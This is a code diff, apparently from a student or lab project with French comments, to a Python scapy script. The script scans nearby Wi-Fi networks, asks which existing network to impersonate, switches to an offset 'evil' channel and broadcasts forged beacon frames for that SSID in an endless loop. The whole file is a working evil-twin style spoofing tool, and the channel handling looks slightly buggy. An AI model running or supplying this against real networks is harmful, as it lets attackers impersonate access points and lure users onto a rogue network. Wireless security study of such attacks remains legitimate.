@@ -10,6 +10,8 @@ iface = 'wlan0'         #Interface name here
 networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel"])
 # set the index BSSID (MAC address of the AP)
 networks.set_index("BSSID", inplace=True)
+isScanning = True
+isPrinting = True
 
 def callback(packet):
     if packet.haslayer(Dot11Beacon):
@@ -29,7 +31,7 @@ def callback(packet):
 
 
 def print_all():
-    while True:
+    while isPrinting:
         os.system("clear")
         print(networks)
         time.sleep(0.5)
@@ -37,16 +39,14 @@ def print_all():
 
 def change_channel():
     ch = 1
-    while True:
-        os.system(f"iwconfig {interface} channel {ch}")
+    while isScanning:
+        os.system(f"iwconfig {iface} channel {ch}")
         # switch channel from 1 to 14 each 0.5s
         ch = ch % 14 + 1
         time.sleep(0.5)
 
 
 if __name__ == "__main__":
-    # interface name, check using iwconfig
-    interface = "wlan0"
     # start the thread that prints all the networks
     printer = Thread(target=print_all)
     printer.daemon = True
@@ -56,10 +56,18 @@ if __name__ == "__main__":
     channel_changer.daemon = True
     channel_changer.start()
     # start sniffing
-    sniff(prn=callback, iface=interface, timeout=20)
+    sniff(prn=callback, iface=iface, timeout=10)
+    # on arrête de scanner et d'afficher les SSID dispos et on arrête les threads
+    isPrinting = False
+    isScanning = False
+    printer.join()
+    channel_changer.join()
 
     netSSID = input("Entrez le nom du wifi à usurper, il doit correspondre à un wifi existant : ")  # Network name here
-    network = networks.loc[bssid]
+    network = networks.loc[networks['SSID'] == netSSID]
+    # positionnement 6 channels plus loin
+    evilChannel = (network['Channel'] + 6) % 14
+    os.system(f"iwconfig {iface} channel {evilChannel[0]}")
 # inspiré de https://www.4armed.com/blog/forging-wifi-beacon-frames-using-scapy/
     dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',
                   addr2='22:22:22:22:22:22', addr3='33:33:33:33:33:33')
@@ -77,4 +85,5 @@ if __name__ == "__main__":
 
     frame = RadioTap() / dot11 / beacon / essid / rsn
 
-    sendp(frame, iface=interface, inter=0.100, loop=1)
+# envoie des trames
+    sendp(frame, iface=iface, inter=0.100, loop=1)
